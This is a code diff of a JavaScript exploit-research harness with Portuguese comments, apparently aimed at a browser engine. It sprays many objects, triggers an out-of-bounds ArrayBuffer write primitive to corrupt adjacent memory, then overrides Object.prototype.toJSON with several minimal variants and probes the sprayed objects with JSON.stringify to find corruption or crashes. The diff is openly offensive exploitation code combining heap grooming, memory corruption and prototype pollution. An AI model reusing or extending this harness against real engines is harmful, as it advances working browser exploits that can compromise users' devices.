@@ -18,19 +18,10 @@ class MyComplexObject {
     }
 
     checkIntegrity() {
-        const FNAME_CHECK = "MyComplexObject.checkIntegrity";
-        if (this.marker !== 0xCAFECAFE) {
-            logS3(`!! ${this.id} - FALHA DE INTEGRIDADE! Marcador esperado 0xCAFECAFE, obtido ${toHex(this.marker)} !!`, 'critical', FNAME_CHECK);
-            return false;
-        }
-        if (this.value1 !== 12345) {
-            logS3(`!! ${this.id} - FALHA DE INTEGRIDADE! value1 esperado 12345, obtido ${this.value1} !!`, 'critical', FNAME_CHECK);
-            return false;
-        }
-        if (this.value2 !== "initial_state") {
-            logS3(`!! ${this.id} - FALHA DE INTEGRIDADE! value2 esperado "initial_state", obtido "${this.value2}" !!`, 'critical', FNAME_CHECK);
-            return false;
-        }
+        // Não vamos logar daqui para manter a toJSON o mais limpa possível inicialmente
+        if (this.marker !== 0xCAFECAFE) return false;
+        if (this.value1 !== 12345) return false;
+        if (this.value2 !== "initial_state") return false;
         return true;
     }
 
@@ -39,32 +30,51 @@ class MyComplexObject {
     }
 }
 
-// toJSON Ultra-Minimalista para este teste
-export function toJSON_UltraMinimalForComplexObject() {
-    // Tente retornar o mínimo possível para ver se o RangeError persiste.
-    // Não faça loops, não acesse muitas propriedades de 'this' inicialmente.
-    // Document.title ou logS3 aqui podem reintroduzir o TypeError se o estado estiver muito ruim.
+// --- Variantes Ultra-Minimalistas da toJSON para MyComplexObject ---
+
+// V0: Apenas retorna um objeto vazio.
+export function toJSON_Complex_V0_EmptyReturn() {
+    return { test_variant: "V0_EmptyReturn" };
+}
+
+// V1: Tenta apenas Object.prototype.toString.call(this)
+export function toJSON_Complex_V1_ToStringCallThis() {
     try {
-        // Apenas para confirmar que foi chamada e qual o tipo de 'this'
-        // Se mesmo isso causar RangeError, é muito sensível.
         const basicType = Object.prototype.toString.call(this);
-        if (this && typeof this.id !== 'undefined') {
-             return { minimal_toJSON_called: true, id: this.id, type: basicType };
-        }
-        return { minimal_toJSON_called: true, type: basicType, id_missing: true };
+        return { test_variant: "V1_ToStringCallThis", type: basicType };
     } catch (e) {
-        // Se o acesso básico a 'this' já falha
-        return { minimal_toJSON_error: e.name + ": " + e.message };
+        return { test_variant: "V1_ToStringCallThis", error: `${e.name}: ${e.message}` };
+    }
+}
+
+// V2: Tenta apenas acessar uma propriedade simples de 'this' (ex: this.id)
+export function toJSON_Complex_V2_AccessThisId() {
+    try {
+        const id = this.id;
+        return { test_variant: "V2_AccessThisId", id_val: String(id).substring(0,20) };
+    } catch (e) {
+        return { test_variant: "V2_AccessThisId", error: `${e.name}: ${e.message}` };
+    }
+}
+
+// V3: Combina V1 e V2 (como na toJSON_UltraMinimalForComplexObject do teste anterior)
+export function toJSON_Complex_V3_ToStringAndId() {
+    try {
+        const basicType = Object.prototype.toString.call(this);
+        const id = this.id;
+        return { test_variant: "V3_ToStringAndId", type: basicType, id_val: String(id).substring(0,20) };
+    } catch (e) {
+        return { test_variant: "V3_ToStringAndId", error: `${e.name}: ${e.message}` };
     }
 }
 
 
-export async function executeSprayAndCorruptComplexObjectsTest() {
-    const FNAME_TEST = "executeSprayAndCorruptComplexObjectsTest";
-    logS3(`--- Iniciando Teste: Spray de Objetos Complexos, Corrupção OOB, e Sondagem (com toJSON Ultra-Minimal) ---`, "test", FNAME_TEST);
-    document.title = `Spray Complex & Corrupt (UltraMinimal toJSON)`;
+export async function executeSprayAndProbeComplexObjects_MinimalToJSON(toJSONFunctionToUse, toJSONFunctionName) {
+    const FNAME_TEST = `executeSprayAndProbe_MinimalToJSON<${toJSONFunctionName}>`;
+    logS3(`--- Iniciando Teste Spray & Probe: Usando ${toJSONFunctionName} ---`, "test", FNAME_TEST);
+    document.title = `Spray & Probe - ${toJSONFunctionName}`;
 
-    const spray_count = 200; 
+    const spray_count = 50; // Reduzido para acelerar os testes, aumente se necessário
     const sprayed_objects = [];
 
     const corruption_offset_in_oob_ab = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16; // 0x70
@@ -79,7 +89,7 @@ export async function executeSprayAndCorruptComplexObjectsTest() {
         logS3(`   Pulverização de ${sprayed_objects.length} objetos concluída.`, "good", FNAME_TEST);
     } catch (e_spray) {
         logS3(`ERRO durante a pulverização: ${e_spray.message}. Abortando.`, "error", FNAME_TEST);
-        return;
+        return { sprayError: e_spray };
     }
     
     await PAUSE_S3(MEDIUM_PAUSE_S3);
@@ -88,8 +98,7 @@ export async function executeSprayAndCorruptComplexObjectsTest() {
     await triggerOOB_primitive();
     if (!oob_array_buffer_real) {
         logS3("Falha OOB Setup. Abortando.", "error", FNAME_TEST);
-        sprayed_objects.length = 0;
-        return;
+        return { oobError: new Error("OOB Setup Failed")};
     }
 
     try {
@@ -98,73 +107,70 @@ export async function executeSprayAndCorruptComplexObjectsTest() {
     } catch (e_write) {
         logS3(`   ERRO na escrita OOB: ${e_write.message}. Abortando sondagem.`, "error", FNAME_TEST);
         clearOOBEnvironment();
-        sprayed_objects.length = 0;
-        return;
+        return { oobWriteError: e_write };
     }
     
     await PAUSE_S3(MEDIUM_PAUSE_S3);
 
-    logS3(`3. Sondando ${sprayed_objects.length} objetos complexos pulverizados com toJSON_UltraMinimalForComplexObject...`, "test", FNAME_TEST);
-    document.title = `Sondando ${sprayed_objects.length} ComplexObjs (UltraMinimal)...`;
-
+    logS3(`3. Sondando ${sprayed_objects.length} objetos complexos pulverizados com ${toJSONFunctionName}...`, "test", FNAME_TEST);
+    
     const ppKey_val = 'toJSON';
     let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey_val);
     let pollutionApplied = false;
-    let problem_detected_in_sprayed = false; // Nome mais genérico
+    let firstProblematicObjectResult = null;
 
     try {
         Object.defineProperty(Object.prototype, ppKey_val, {
-            value: toJSON_UltraMinimalForComplexObject, // Usando a toJSON ultra-minimal
+            value: toJSONFunctionToUse,
             writable: true, configurable: true, enumerable: false
         });
         pollutionApplied = true;
 
-        for (let i = 0; i < sprayed_objects.length; i++) {
+        // Sondar apenas os primeiros, ou um número limitado, para identificar o problema mais rapidamente
+        const objectsToProbe = Math.min(sprayed_objects.length, 10); 
+        logS3(`   Sondando os primeiros ${objectsToProbe} objetos...`, 'info', FNAME_TEST);
+
+        for (let i = 0; i < objectsToProbe; i++) {
             const obj = sprayed_objects[i];
             if (!obj) continue;
-
-            if (i > 0 && i % 50 === 0) { // Log menos frequente
-                logS3(`   Sondando objeto ${i}/${sprayed_objects.length}...`, 'info', FNAME_TEST);
-                await PAUSE_S3(SHORT_PAUSE_S3);
-            }
-
-            let integrityOK = true;
+            
+            document.title = `Sondando Obj ${i} com ${toJSONFunctionName}`;
             let stringifyResult = null;
-            let errorDuringProbe = null;
+            let errorDuringStringify = null;
+            let integrityOK = obj.checkIntegrity();
 
+
+            logS3(`   Testando objeto ${i} (ID: ${obj.id}, Integridade ANTES: ${integrityOK})...`, 'info', FNAME_TEST);
             try {
-                // Primeiro, verifica a integridade ANTES do stringify, se possível
-                integrityOK = obj.checkIntegrity();
-                if (!integrityOK) {
-                    logS3(`   !!!! CORRUPÇÃO DE PROPRIEDADE DETECTADA em sprayed_objects[${i}] ANTES de stringify !!!!`, "critical", FNAME_TEST);
-                }
-                
-                // Agora tenta o stringify
                 stringifyResult = JSON.stringify(obj);
-
-                // Se stringifyResult contém erro da toJSON_UltraMinimalForComplexObject
-                if (stringifyResult && stringifyResult.minimal_toJSON_error) {
-                     logS3(`   !!!! ERRO DENTRO DA toJSON_UltraMinimal para sprayed_objects[${i}] !!!!: ${stringifyResult.minimal_toJSON_error}`, "critical", FNAME_TEST);
-                     errorDuringProbe = new Error(stringifyResult.minimal_toJSON_error);
+                 logS3(`     JSON.stringify(obj[${i}]) completou. Resultado da toJSON: ${JSON.stringify(stringifyResult)}`, "info", FNAME_TEST);
+                // Verifica se a toJSON em si reportou um erro interno
+                if (stringifyResult && stringifyResult.error) {
+                    errorDuringStringify = new Error(`Erro interno da toJSON: ${stringifyResult.error}`);
+                     logS3(`     ERRO DENTRO da toJSON para obj[${i}]: ${stringifyResult.error}`, "warn", FNAME_TEST);
                 }
 
-
-            } catch (e_probe) { // Captura erros do JSON.stringify em si (como RangeError)
-                errorDuringProbe = e_probe;
-                logS3(`   !!!! ERRO AO STRINGIFY sprayed_objects[${i}] !!!!: ${e_probe.name} - ${e_probe.message}`, "critical", FNAME_TEST);
+            } catch (e_str) {
+                errorDuringStringify = e_str;
+                logS3(`     !!!! ERRO AO STRINGIFY obj[${i}] !!!!: ${e_str.name} - ${e_str.message}`, "critical", FNAME_TEST);
             }
 
-            if (!integrityOK || errorDuringProbe) {
-                problem_detected_in_sprayed = true;
-                logS3(`   Problema com Objeto: sprayed_objects[${i}].id = ${obj.id || 'ID inacessível'}`, "critical", FNAME_TEST);
-                logS3(`     Integridade: ${integrityOK}, Erro Sonda (stringify/toJSON): ${errorDuringProbe ? `${errorDuringProbe.name} - ${errorDuringProbe.message}` : 'Nenhum'}`, "info", FNAME_TEST);
-                logS3(`     Resultado Stringify (se houve): ${stringifyResult ? JSON.stringify(stringifyResult) : 'N/A'}`, "info", FNAME_TEST);
-                document.title = `PROBLEM ComplexObj @ ${i}! (${errorDuringProbe ? errorDuringProbe.name : 'IntegrityFail'})`;
+            if (!integrityOK || errorDuringStringify) {
+                firstProblematicObjectResult = {
+                    index: i,
+                    id: obj.id,
+                    integrityOK: integrityOK,
+                    error: errorDuringStringify ? {name: errorDuringStringify.name, message: errorDuringStringify.message} : null,
+                    toJSONReturn: stringifyResult 
+                };
+                document.title = `PROBLEMA Obj ${i} com ${toJSONFunctionName}! (${errorDuringStringify ? errorDuringStringify.name : 'IntegrityFail'})`;
                 break; 
             }
+             await PAUSE_S3(SHORT_PAUSE_S3); // Pausa entre objetos
         }
     } catch (e_main_loop) {
-        logS3(`Erro no loop principal de sondagem de objetos complexos: ${e_main_loop.message}`, "error", FNAME_TEST);
+        logS3(`Erro no loop principal de sondagem: ${e_main_loop.message}`, "error", FNAME_TEST);
+        firstProblematicObjectResult = { error: {name: "MainLoopError", message: e_main_loop.message }};
     } finally {
         if (pollutionApplied) {
             if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey_val, originalToJSONDescriptor);
@@ -172,13 +178,15 @@ export async function executeSprayAndCorruptComplexObjectsTest() {
         }
     }
 
-    if (!problem_detected_in_sprayed) {
-        logS3("Nenhum problema óbvio (corrupção de propriedade ou erro de stringify/toJSON) detectado nos objetos complexos pulverizados.", "good", FNAME_TEST);
+    if (firstProblematicObjectResult) {
+        logS3(`PROBLEMA DETECTADO com ${toJSONFunctionName}: Objeto index ${firstProblematicObjectResult.index} (ID: ${firstProblematicObjectResult.id})`, "critical", FNAME_TEST);
+    } else {
+        logS3(`Nenhum problema óbvio (crash/erro/falha de integridade) detectado nos primeiros ${Math.min(sprayed_objects.length, 10)} objetos sondados com ${toJSONFunctionName}.`, "good", FNAME_TEST);
     }
 
-    logS3(`--- Teste Spray de Objetos Complexos (toJSON Ultra-Minimal) CONCLUÍDO ---`, "test", FNAME_TEST);
+    logS3(`--- Teste Spray & Probe com ${toJSONFunctionName} CONCLUÍDO ---`, "test", FNAME_TEST);
     clearOOBEnvironment();
     sprayed_objects.length = 0; 
     globalThis.gc?.(); 
-    document.title = problem_detected_in_sprayed ? document.title : `Spray Complex (UltraMinimal) Done`;
+    return firstProblematicObjectResult;
 }
